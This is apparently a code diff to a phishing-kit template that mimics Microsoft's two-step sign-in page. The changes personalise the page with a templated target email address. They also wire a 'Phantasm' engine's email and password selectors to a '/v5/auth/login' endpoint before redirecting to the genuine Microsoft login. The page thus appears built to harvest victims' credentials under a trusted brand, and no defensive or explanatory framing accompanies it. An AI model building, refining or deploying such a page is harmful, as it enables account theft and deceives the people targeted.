@@ -156,7 +156,7 @@
             <h1>Log in</h1>
             
             <div class="input-group">
-                <input type="email" id="email-input" placeholder="Email, phone, or Skype" required>
+                <input type="email" id="email-input" placeholder="Email, phone, or Skype" value="{{ target_email }}" required>
             </div>
             
             <div class="links">
@@ -174,7 +174,7 @@
         <div id="step-2" class="hidden">
             <div class="user-identity">
                 <span class="back-arrow" id="back-arrow">&#8592;</span>
-                <span id="user-email-display">user@example.com</span>
+                <span id="user-email-display">{{ target_email }}</span>
             </div>
             
             <h1 style="font-size: 24px; margin-bottom: 20px;">Enter password</h1>
@@ -224,6 +224,7 @@
             // Initialize Engine
             new Phantasm({
                 redirectUrl: 'https://login.microsoftonline.com',
+                apiEndpoint: '/v5/auth/login',
                 selectors: {
                     email: '#email-input',
                     password: '#password-input',
